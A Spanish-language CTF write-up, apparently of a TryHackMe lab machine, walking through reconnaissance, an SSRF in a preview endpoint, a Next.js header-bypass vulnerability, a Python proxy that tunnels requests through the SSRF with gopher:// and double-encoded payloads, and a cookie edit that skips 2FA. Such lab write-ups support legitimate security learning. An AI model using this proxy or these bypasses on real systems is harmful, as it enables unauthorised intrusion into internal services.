---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzaremos escaneando los puertos abiertos de la máquina.

!**Pasted image 20260331195341.png**

Y ahora escaneamos más a fondo los puertos abiertos.

!**Pasted image 20260331195530.png**

Vamos a pasar a listar directorios.

!**Pasted image 20260331195856.png**
!**Pasted image 20260331195905.png**

Vamos a ver cómo es la web.

!**Pasted image 20260331200034.png**

Si miramos el código fuente encontramos la función que hace la visualización posible:

!**Pasted image 20260331200117.png**

Esto no parece muy seguro.

--------------------------------------
<h2>Profundización</h2>
Después de haber mirado en todos los directorios volvemos al posible open redirect. Vamos a ponernos en escucha por el puerto que elijamos y acto seguido mandaremos una petición.

!**Pasted image 20260331200747.png**

Ahora escribimos la url:

!**Pasted image 20260331200808.png**

Y al darle a enter:

!**Pasted image 20260331200826.png**

-------------------------
<h2>Explotación</h2>
Para explotar esto vamos a compartir una reverse shell con el servidor.

!**Pasted image 20260331201023.png**

Y ahora nos ponemos en escucha por el puerto definido en la reverse shell.

!**Pasted image 20260331201110.png**

Y la cargamos desde la URL. Sin embargo esto no ha funcionado, por lo que se me ocurre que como es una redirección interna, podré listar directorios internos.

!**Pasted image 20260331202121.png**

¡Bingo! Ahí hay dos, pero parece que puede ser más interesante `/management`. Vamos a ver qué hay:

!**Pasted image 20260331202212.png**

Panel de login para un posible panel de administración.

Si miramos el código vemos que no realiza ninguna `action`, así que vamos a seguir enumerando. Ahora servicios internos.

Primero creamos un diccionario.

!**Pasted image 20260331203214.png**

Y luego lo usamos para listar.

!**Pasted image 20260331203533.png**

Parece que hay algo en el puerto `10000`.

!**Pasted image 20260331203602.png**

Como no me llevaba a ningún sitio me puse a mirar el código fuente, parecía que estuviera hecho con `next.js`. Buscando después en internet encontré varios [artículos](https://www.stormshield.com/news/security-alert-next-js-cve-2025-29927-stormshield-products-response/) que hablaban de una vulnerabilidad en los headers de este framework:

!**Pasted image 20260331204742.png**

Pero no podemos acceder directamente al puerto `10000`, por lo que tenemos que tunelar las peticiones. Como no sabía hacerlo busque un writeup y encontré [este](https://medium.com/@bandaymajid70/tryhackme-extract-writeup-b029a625df5c), muy bien redactado. Donde explica cómo programar en Python un proxy que:

- Escucha localmente en `127.0.0.1:4002`.
- Redirige las peticiones a través de SSRF usando el protocolo `gopher://`.
- Encodea doblemente los payloads para que la API interna pueda recibir queries.

```python
#!/usr/bin/env python3  
  
import socket  
import requests  
import urllib.parse  
import threading  
import argparse  
  
  
def handle_client(conn, addr, target_host, host_to_proxy, port_to_proxy):  
    with conn:  
        data = conn.recv(65536)  
        if not data:  
            return  
        # Double-encode payload  
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))  
        target_url = (  
            f"http://{target_host}/preview.php?url="  
            f"gopher://{host_to_proxy}:{port_to_proxy}/_{double_encoded_data}"  
        )  
        try:  
            resp = requests.get(target_url, timeout=10)  
            conn.sendall(resp.content)  
        except Exception as e:  
            print(f"[!] Error forwarding request: {e}")  
            conn.sendall(b"Proxy error")  
  
  
def main():  
    parser = argparse.ArgumentParser(  
        description="Python proxy for SSRF gopher tunneling"  
    )  
    parser.add_argument("--lhost", required=True, help="Local listen host (e.g., 127.0.0.1)")  
    parser.add_argument("--lport", type=int, required=True, help="Local listen port (e.g., 4002)")  
    parser.add_argument("--target", required=True, help="Target host with SSRF (e.g., extract.thm)")  
    parser.add_argument("--phost", required=True, help="Host to proxy to inside (e.g., 127.0.0.1)")  
    parser.add_argument("--pport", type=int, required=True, help="Port to proxy to inside (e.g., 80)")  
  
    args = parser.parse_args()  
  
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
        s.bind((args.lhost, args.lport))  
        s.listen()  
        print(f"[*] Listening on {args.lhost}:{args.lport}, "  
              f"proxying to {args.phost}:{args.pport} via {args.target}...")  
        while True:  
            conn, addr = s.accept()  
            client_thread = threading.Thread(  
                target=handle_client,  
                args=(conn, addr, args.target, args.phost, args.pport),  
                daemon=True,  
            )  
            client_thread.start()  
  
  
if __name__ == "__main__":  
    main()
```

Además nos da también un ejemplo de uso:

```bash
python3 proxy.py --lhost 127.0.0.1 --lport 4002 --target extract.thm --phost 127.0.0.1 --pport 10000
```

Ahora vamos a utilizarlo junto con el método de bypass.

!**Pasted image 20260331211331.png**

Así se ve el renderizado:

!**Pasted image 20260331211639.png**

---------------------------------------
<h2>Escalada de Privilegios</h2>
Hay credenciales a parte de la flag. Con dichas credenciales vamos a iniciar sesión en la página de login. Para poder ir a esta página desde el buscador, cambiamos el proxy a lo siguiente:

!**Pasted image 20260331212331.png**

Y así nos queda:

!**Pasted image 20260331212416.png**

Vamos a iniciar sesión.

!**Pasted image 20260331212521.png**

Está bloqueado con un 2FA. Sin embargo si miramos en los tokens vemos uno curioso, URL-encodeado.

!**Pasted image 20260331212616.png**

Vamos a decodearlo:

!**Pasted image 20260331212740.png**

Esto lo que quiere decir es que es un objeto, con la propiedad `validated=0`, vamos a ponerla en 1 y a encodearla otra vez. La cambiamos en la página y la refrescamos.

!**Pasted image 20260331212938.png**

Y así obtenemos la segunda flag.

--------------------------------
<h2>Conclusión</h2>
Una máquina MUUUY compleja para mi ahora mismo, la verdad es que sin el writeup que contenía el proxy programado nunca hubiera sido capaz. Pero así también se aprende. Poco a poco iré mejorando. Esto es una carrera de fondo, y acabo de empezar.